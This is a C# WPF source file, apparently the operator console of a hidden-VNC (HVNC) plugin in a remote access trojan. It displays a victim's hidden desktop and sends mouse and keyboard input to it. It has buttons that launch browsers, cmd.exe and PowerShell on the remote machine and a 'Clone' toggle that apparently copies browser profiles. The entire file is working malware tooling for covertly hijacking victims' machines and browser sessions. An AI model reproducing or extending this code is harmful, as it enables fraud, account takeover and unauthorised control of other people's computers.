using System;
using System.IO;
using System.Runtime.Versioning;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Microsoft.Win32;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class HvncUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private Color BgCol => C("BackgroundColor");
        private Color SurfCol => C("SurfaceColor");
        private Color SurfLCol => C("SurfaceLightColor");
        private Color BrdCol => C("BorderColor");
        private Color TxtCol => C("TextPrimaryColor");
        private Color DimCol => C("TextSecondaryColor");
        private Color PriCol => C("PrimaryColor");
        private Color PriHov => C("PrimaryHoverColor");
        private Color DanCol => C("DangerColor");
        private Color DanHov => C("DangerHoverColor");
        private Color OkCol => C("SuccessColor");
        private Color OkHov => C("SuccessHoverColor");
        private Color DisCol => C("ButtonBgColor");
        private Color ButtonBorderClr => C("ButtonBorderColor");
        private Color ButtonBgClr => C("ButtonBgColor");
        private Color ButtonBgHoverClr => C("ButtonBgHoverColor");

        private SolidColorBrush BgB => B("BackgroundBrush");
        private SolidColorBrush SfB => B("SurfaceBrush");
        private SolidColorBrush TxB => B("TextPrimaryBrush");
        private SolidColorBrush DmB => B("TextSecondaryBrush");
        private SolidColorBrush GnB => B("SuccessBrush");
        private SolidColorBrush BdB => B("BorderBrush");
        private SolidColorBrush DsB => B("ButtonBgBrush");

        private readonly PluginContext _context;
        private readonly Image _img;
        private readonly TextBlock _status, _fpsLbl, _bpsLbl, _qLbl;
        private readonly Slider _qSlider;
        private readonly Button _startBtn, _stopBtn;
        private readonly TextBox _logBox;
        private readonly Border _logBrd;
        private readonly CheckBox _cloneChk;

        private bool _streaming, _cloneEnabled, _inputEnabled = true;
        private int _rw = 1920, _rh = 1080, _fc, _fpc, _logLines;
        private long _bpc;
        private DateTime _lastFps = DateTime.UtcNow, _lastMouse = DateTime.MinValue;
        private bool _disposed;

        public HvncUI(PluginContext ctx, PluginHost host, HvncPlugin plugin)
        {
            _context = ctx;
            var g = new Grid();
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var tb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(4, 1, 4, 1) };
            var tw = new StackPanel { Orientation = Orientation.Horizontal };
            _startBtn = Btn("Start", OkCol, OkHov, null); _startBtn.Click += (s, e) => DoStart();
            _stopBtn = Btn("Stop", DanCol, DanHov, null); _stopBtn.IsEnabled = false; _stopBtn.Click += (s, e) => DoStop();
            tw.Children.Add(_startBtn); tw.Children.Add(_stopBtn); tw.Children.Add(Sep());
            var saveBtn = Btn("Save", ButtonBgClr, ButtonBgHoverClr); saveBtn.Click += (s, e) => DoSave();
            tw.Children.Add(saveBtn);
            tw.Children.Add(Lbl("Q:"));
            _qSlider = new Slider { Width = 70, Minimum = 10, Maximum = 100, Value = 60, TickFrequency = 5, IsSnapToTickEnabled = true, Margin = new Thickness(2, 1, 2, 1), VerticalAlignment = VerticalAlignment.Center };
            _qSlider.ValueChanged += (s, e) => { _qLbl.Text = ((int)_qSlider.Value) + "%"; if (_streaming) SndQ(); };
            tw.Children.Add(_qSlider); _qLbl = Lbl("60%"); tw.Children.Add(_qLbl);
            _fpsLbl = new TextBlock { Text = "0fps", Foreground = GnB, FontSize = 11, FontWeight = FontWeights.SemiBold, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 1, 2, 1) };
            tw.Children.Add(_fpsLbl);
            _bpsLbl = new TextBlock { Text = "", Foreground = DmB, FontSize = 10, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(2, 1, 2, 1) };
            tw.Children.Add(_bpsLbl);
            tw.Children.Add(Sep());
            var inputBorder = new Border { Background = new SolidColorBrush(OkCol), CornerRadius = new CornerRadius(5), Padding = new Thickness(6, 2, 6, 2), Margin = new Thickness(1), Cursor = Cursors.Hand, VerticalAlignment = VerticalAlignment.Center };
            var inputTb = new TextBlock { Text = "Input: ON", Foreground = TxB, FontSize = 11, FontWeight = FontWeights.SemiBold };
            inputBorder.Child = inputTb;
            inputBorder.MouseLeftButtonDown += (s, e) => { _inputEnabled = !_inputEnabled; inputTb.Text = _inputEnabled ? "Input: ON" : "Input: OFF"; inputBorder.Background = new SolidColorBrush(_inputEnabled ? OkCol : DanCol); Log("[HVNC] Input " + (_inputEnabled ? "enabled" : "disabled")); };
            tw.Children.Add(inputBorder);
            _cloneChk = new CheckBox { Content = "Clone", Foreground = TxB, FontSize = 10, IsChecked = false, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 1, 2, 1) };
            _cloneChk.Checked += async (s, e) => { _cloneEnabled = true; try { await _context.SendToClient(new byte[] { 0x06 }); } catch { } };
            _cloneChk.Unchecked += async (s, e) => { _cloneEnabled = false; try { await _context.SendToClient(new byte[] { 0x07 }); } catch { } };
            tw.Children.Add(_cloneChk);
            var killBtn = Btn("Close All", DanCol, C("DangerHoverColor"), null); killBtn.Click += async (s, e) => { try { await _context.SendToClient(new byte[] { 0x0E }); Log("[HVNC] Close All sent"); } catch { } };
            tw.Children.Add(killBtn);
            var logToggle = new HvncToggleSwitch("Log"); logToggle.IsOn = false;
            logToggle.Toggled += on => _logBrd.Visibility = on ? Visibility.Visible : Visibility.Collapsed;
            tw.Children.Add(logToggle);
            var clearBtn = Btn("Clear", ButtonBgClr, ButtonBgHoverClr); clearBtn.Click += (s, e) => { _logBox.Text = ""; _logLines = 0; };
            tw.Children.Add(clearBtn);
            tb.Child = tw; Grid.SetRow(tb, 0); g.Children.Add(tb);

            var appB = new Border { Background = new SolidColorBrush(SurfCol), BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(6, 2, 6, 2) };
            var appP = new WrapPanel();
            appP.Children.Add(SmBtn("Chrome", 8));
            appP.Children.Add(SmBtn("Edge", 10));
            appP.Children.Add(SmBtn("Firefox", 9));
            appP.Children.Add(SmBtn("Brave", 13));
            appP.Children.Add(SmBtn("Opera", 11));
            appP.Children.Add(SmBtn("Opera GX", 12));
            appP.Children.Add(SmBtn("CMD", 0xFF));
            appP.Children.Add(SmBtn("PS", 0xFE));
            appP.Children.Add(SmBtn("Explorer", 4));
            appB.Child = appP; Grid.SetRow(appB, 1); g.Children.Add(appB);

            var ib = new Border { Background = BgB };
            _img = new Image { Stretch = Stretch.Fill, Cursor = Cursors.Cross };
            RenderOptions.SetBitmapScalingMode(_img, BitmapScalingMode.Fant);
            _img.MouseMove += ImgMove; _img.MouseDown += ImgDown; _img.MouseWheel += ImgWheel;
            ib.Child = _img; Grid.SetRow(ib, 2); g.Children.Add(ib);

            _logBrd = new Border { Background = BgB, BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0), Height = 140, Visibility = Visibility.Collapsed };
            _logBox = new TextBox
            {
                Background = BgB,
                Foreground = GnB,
                BorderThickness = new Thickness(0), FontFamily = new FontFamily("Consolas"), FontSize = 11,
                IsReadOnly = true, TextWrapping = TextWrapping.Wrap, VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
                Padding = new Thickness(4), CaretBrush = Brushes.Transparent, AcceptsReturn = true, Style = null
            };
            _logBrd.Child = _logBox; Grid.SetRow(_logBrd, 3); g.Children.Add(_logBrd);

            var stB = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0), Padding = new Thickness(10, 5, 10, 5) };
            _status = new TextBlock { Text = "Ready - Click Start", Foreground = DmB, FontSize = 12 };
            stB.Child = _status; Grid.SetRow(stB, 4); g.Children.Add(stB);

            Content = g; Background = BgB; Focusable = true; MinWidth = 640; MinHeight = 440; KeyDown += KD; KeyUp += KU; PreviewTextInput += TI;
        }

        Button SmBtn(string label, byte cmd)
        {
            var b = Btn(label, SurfLCol, C("ButtonBgHoverColor"));
            b.FontSize = 10; b.Margin = new Thickness(1); b.Tag = cmd;
            b.Click += async (s, e) =>
            {
                byte c = (byte)((Button)s).Tag;
                if (c == 0xFF) {
                    var p = Encoding.UTF8.GetBytes("C:\\Windows\\System32\\cmd.exe /k"); var m = new byte[p.Length + 1]; m[0] = 0x05; Buffer.BlockCopy(p, 0, m, 1, p.Length);
                    try { await _context.SendToClient(m); Log("[LAUNCH] cmd"); } catch { }
                }
                else if (c == 0xFE) {
                    var p = Encoding.UTF8.GetBytes("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit"); var m = new byte[p.Length + 1]; m[0] = 0x05; Buffer.BlockCopy(p, 0, m, 1, p.Length);
                    try { await _context.SendToClient(m); Log("[LAUNCH] powershell"); } catch { }
                }
                else if (c == 4) {
                    try { await _context.SendToClient(new byte[] { 0x04 }); Log("[LAUNCH] Explorer"); } catch { }
                }
                else {
                    try { await _context.SendToClient(new byte[] { c }); Log("[LAUNCH] Browser cmd=" + c); } catch { }
                }
            };
            return b;
        }

        void Log(string m) { if (_disposed) return; var l = "[" + DateTime.Now.ToString("HH:mm:ss.fff") + "] " + m + "\n"; if (!Dispatcher.CheckAccess()) Dispatcher.BeginInvoke(() => LogI(l)); else LogI(l); }
        void LogI(string l) { if (_disposed) return; _logBox.AppendText(l); _logLines++; if (_logLines > 300) { var t = _logBox.Text; int c = 0; for (int i = 0; i < 50 && c < t.Length; i++) { int n = t.IndexOf('\n', c); if (n < 0) break; c = n + 1; } if (c > 0) { _logBox.Text = t.Substring(c); _logLines -= 50; } } _logBox.ScrollToEnd(); }

        Button Btn(string t, Color bg, Color hv, SolidColorBrush fg = null)
        {
            var nb = new SolidColorBrush(bg); var hb = new SolidColorBrush(hv);
            var bb = new SolidColorBrush(ButtonBorderClr); var db = new SolidColorBrush(DisCol);
            var tmpl = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tmpl.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tmpl.Triggers.Add(h);
            var p = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tmpl.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tmpl.Triggers.Add(d);
            return new Button { Content = t, Template = tmpl, Foreground = fg ?? TxB, Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        TextBlock Lbl(string t) => new() { Text = t, Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 2, 4, 2) };
        Border Sep() => new() { Width = 1, Background = new SolidColorBrush(ButtonBorderClr), Margin = new Thickness(4, 2, 4, 2) };
        void St(string t) { if (!Dispatcher.CheckAccess()) Dispatcher.BeginInvoke(() => _status.Text = t); else _status.Text = t; }

        async void DoStart()
        {
            try { await _context.SendToClient(new byte[] { 0x00 }); } catch { return; }
            _streaming = true; _fc = 0; _fpc = 0; _bpc = 0; _lastFps = DateTime.UtcNow;
            _startBtn.IsEnabled = false; _stopBtn.IsEnabled = true;
            St("Streaming Q=" + (int)_qSlider.Value + "%");
        }
        async void DoStop()
        {
            _streaming = false;
            try { await _context.SendToClient(new byte[] { 0x01 }); } catch { }
            _startBtn.IsEnabled = true; _stopBtn.IsEnabled = false; St("Stopped.");
        }
        async void SndQ()
        {
            int q = (int)_qSlider.Value;
            try { await _context.SendToClient(new byte[] { 0x02, (byte)(q & 0xFF), (byte)((q >> 8) & 0xFF), (byte)((q >> 16) & 0xFF), (byte)((q >> 24) & 0xFF) }); } catch { }
        }
        void DoSave()
        {
            if (_img.Source == null) return;
            var d = new SaveFileDialog { FileName = "hvnc_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png", Filter = "PNG|*.png|JPEG|*.jpg" };
            if (d.ShowDialog() != true) return;
            try { var s = _img.Source as BitmapSource; if (s == null) return; BitmapEncoder e = d.FileName.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase) ? new JpegBitmapEncoder { QualityLevel = 95 } : (BitmapEncoder)new PngBitmapEncoder(); e.Frames.Add(BitmapFrame.Create(s)); using var fs = new FileStream(d.FileName, FileMode.Create); e.Save(fs); } catch { }
        }
        
        (int x, int y)? Coord(MouseEventArgs e)
        {
            if (_img.Source == null) return null;
            var p = e.GetPosition(_img);
            double iw = _img.ActualWidth, ih = _img.ActualHeight;
            if (iw <= 0 || ih <= 0) return null;
            double rx = p.X / iw, ry = p.Y / ih;
            if (rx < 0 || rx > 1 || ry < 0 || ry > 1) return null;
            return ((int)(rx * _rw), (int)(ry * _rh));
        }

        async void ImgMove(object s, MouseEventArgs e)
        {
            if (!_streaming || !_inputEnabled) return;
            var n = DateTime.UtcNow;
            if ((n - _lastMouse).TotalMilliseconds < 16) return;
            _lastMouse = n;
            var c = Coord(e);
            if (c == null) return;
            int msg = 0x0200, wParam = 0, lParam = (c.Value.y << 16) | (c.Value.x & 0xFFFF);
            var m = new byte[13]; m[0] = 0x03;
            Buffer.BlockCopy(BitConverter.GetBytes(msg), 0, m, 1, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(wParam), 0, m, 5, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(lParam), 0, m, 9, 4);
            try { await _context.SendToClient(m); } catch { }
        }

        async void ImgDown(object s, MouseButtonEventArgs e)
        {
            if (!_streaming || !_inputEnabled) return;
            var c = Coord(e);
            if (c == null) return;
            int msg = e.ChangedButton switch
            {
                MouseButton.Left => e.ClickCount >= 2 ? 0x0203 : 0x0201,
                MouseButton.Right => 0x0204,
                MouseButton.Middle => 0x0207,
                _ => -1
            };
            if (msg == -1) return;
            int lParam = (c.Value.y << 16) | (c.Value.x & 0xFFFF);
            var m = new byte[13]; m[0] = 0x03;
            Buffer.BlockCopy(BitConverter.GetBytes(msg), 0, m, 1, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(1), 0, m, 5, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(lParam), 0, m, 9, 4);
            try { await _context.SendToClient(m); } catch { }
            await Task.Delay(30);
            int upMsg = e.ChangedButton switch { MouseButton.Left => 0x0202, MouseButton.Right => 0x0205, MouseButton.Middle => 0x0208, _ => -1 };
            if (upMsg == -1) return;
            m = new byte[13]; m[0] = 0x03;
            Buffer.BlockCopy(BitConverter.GetBytes(upMsg), 0, m, 1, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(0), 0, m, 5, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(lParam), 0, m, 9, 4);
            try { await _context.SendToClient(m); } catch { }
            Focus();
        }

        async void ImgWheel(object s, MouseWheelEventArgs e)
        {
            if (!_streaming || !_inputEnabled) return;
            var c = Coord(e);
            if (c == null) return;
            int msg = 0x020A;
            int keyState = 0;
            if (Keyboard.IsKeyDown(Key.LeftCtrl) || Keyboard.IsKeyDown(Key.RightCtrl)) keyState |= 0x0008;
            if (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift)) keyState |= 0x0004;
            if (Keyboard.IsKeyDown(Key.LeftAlt) || Keyboard.IsKeyDown(Key.RightAlt)) keyState |= 0x0020;
            int wParam = keyState | ((e.Delta << 16) & unchecked((int)0xFFFF0000));
            int lParam = (c.Value.y << 16) | (c.Value.x & 0xFFFF);
            var m = new byte[13]; m[0] = 0x03;
            Buffer.BlockCopy(BitConverter.GetBytes(msg), 0, m, 1, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(wParam), 0, m, 5, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(lParam), 0, m, 9, 4);
            try { await _context.SendToClient(m); } catch { }
        }

        async void KD(object s, KeyEventArgs e)
        {
            if (!_streaming || !_inputEnabled) return;
            if (e.IsRepeat) return;
            byte vk = (byte)KeyInterop.VirtualKeyFromKey(e.Key);
            if (vk == 0) return;
            int msg = 0x0100, wParam = vk, lParam = 1;
            var m = new byte[13]; m[0] = 0x03;
            Buffer.BlockCopy(BitConverter.GetBytes(msg), 0, m, 1, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(wParam), 0, m, 5, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(lParam), 0, m, 9, 4);
            try { await _context.SendToClient(m); } catch { }
            e.Handled = true;
        }

        async void KU(object s, KeyEventArgs e)
        {
            if (!_streaming || !_inputEnabled) return;
            if (e.IsRepeat) return;
            byte vk = (byte)KeyInterop.VirtualKeyFromKey(e.Key);
            if (vk == 0) return;
            int msg = 0x0101, wParam = vk, lParam = 1;
            var m = new byte[13]; m[0] = 0x03;
            Buffer.BlockCopy(BitConverter.GetBytes(msg), 0, m, 1, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(wParam), 0, m, 5, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(lParam), 0, m, 9, 4);
            try { await _context.SendToClient(m); } catch { }
            e.Handled = true;
        }

        async void TI(object s, TextCompositionEventArgs e)
        {
            if (!_streaming || !_inputEnabled) return;
            foreach (char c in e.Text)
            {
                int msg = 0x0102, wParam = c, lParam = 1;
                var m = new byte[13]; m[0] = 0x03;
                Buffer.BlockCopy(BitConverter.GetBytes(msg), 0, m, 1, 4);
                Buffer.BlockCopy(BitConverter.GetBytes(wParam), 0, m, 5, 4);
                Buffer.BlockCopy(BitConverter.GetBytes(lParam), 0, m, 9, 4);
                try { await _context.SendToClient(m); } catch { }
            }
            e.Handled = true;
        }

        public void HandleServerData(byte[] data)
        {
            if (_disposed || data == null || data.Length == 0) return;
            if (data[0] == 0x80) { HandleFrame(data); return; }
            Dispatcher.BeginInvoke(() => { if (_disposed) return; try { if (data[0] == 0xFD && data.Length > 1) Log(Encoding.UTF8.GetString(data, 1, data.Length - 1)); } catch { } });
        }

        void HandleFrame(byte[] d)
        {
            if (d.Length < 11) return;
            int w = d[1] | (d[2] << 8), h = d[3] | (d[4] << 8);
            int jl = d[5] | (d[6] << 8) | (d[7] << 16) | (d[8] << 24);
            if (w <= 0 || w > 15360 || h <= 0 || h > 8640 || jl <= 2 || 9 + jl > d.Length) return;
            if (d[9] != 0xFF || d[10] != 0xD8) return;
            BitmapImage bmp;
            try { using var ms = new MemoryStream(d, 9, jl, false); bmp = new BitmapImage(); bmp.BeginInit(); bmp.CacheOption = BitmapCacheOption.OnLoad; bmp.StreamSource = ms; bmp.EndInit(); bmp.Freeze(); } catch { return; }
            int fw = w, fh = h, bytes = d.Length;
            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return; _rw = fw; _rh = fh; _img.Source = bmp; _fc++; _fpc++; _bpc += bytes;
                var now = DateTime.UtcNow;
                if ((now - _lastFps).TotalSeconds >= 1)
                {
                    _fpsLbl.Text = _fpc + " fps"; _bpsLbl.Text = (_bpc * 8.0 / 1000000.0).ToString("F1") + " Mbps";
                    _fpc = 0; _bpc = 0; _lastFps = now;
                }
            }, System.Windows.Threading.DispatcherPriority.Render);
        }

        public void Dispose() { _disposed = true; if (_streaming) try { _context.SendToClient(new byte[] { 0x01 }).Wait(500); } catch { } }
    }

    [SupportedOSPlatform("windows")]
    public class HvncToggleSwitch : Border
    {
        private bool _isOn; private readonly Border _thumb, _track;
        public event Action<bool> Toggled;
        public bool IsOn { get => _isOn; set { _isOn = value; Upd(); } }
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        public HvncToggleSwitch(string label)
        {
            Margin = new Thickness(4, 2, 4, 2); Cursor = Cursors.Hand;
            Background = new SolidColorBrush(C("SurfaceLightColor"));
            CornerRadius = new CornerRadius(5); Padding = new Thickness(10, 4, 10, 4);
            BorderBrush = new SolidColorBrush(C("BorderColor")); BorderThickness = new Thickness(1);
            var p = new StackPanel { Orientation = Orientation.Horizontal };
            p.Children.Add(new TextBlock { Text = label, Foreground = new SolidColorBrush(C("TextPrimaryColor")), FontSize = 12, FontWeight = FontWeights.SemiBold, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(0, 0, 8, 0) });
            _track = new Border { Width = 36, Height = 18, CornerRadius = new CornerRadius(9), Background = new SolidColorBrush(C("ButtonBgColor")), VerticalAlignment = VerticalAlignment.Center };
            _thumb = new Border { Width = 14, Height = 14, CornerRadius = new CornerRadius(7), Background = new SolidColorBrush(C("TextPrimaryColor")), HorizontalAlignment = HorizontalAlignment.Left, Margin = new Thickness(2, 0, 0, 0) };
            _track.Child = _thumb; p.Children.Add(_track); Child = p;
            MouseLeftButtonDown += (s, e) => { _isOn = !_isOn; Upd(); Toggled?.Invoke(_isOn); }; Upd();
        }
        void Upd() { if (_isOn) { _thumb.HorizontalAlignment = HorizontalAlignment.Right; _thumb.Margin = new Thickness(0, 0, 2, 0); _track.Background = new SolidColorBrush(C("SuccessColor")); } else { _thumb.HorizontalAlignment = HorizontalAlignment.Left; _thumb.Margin = new Thickness(2, 0, 0, 0); _track.Background = new SolidColorBrush(C("ButtonBgColor")); } }
    }
}
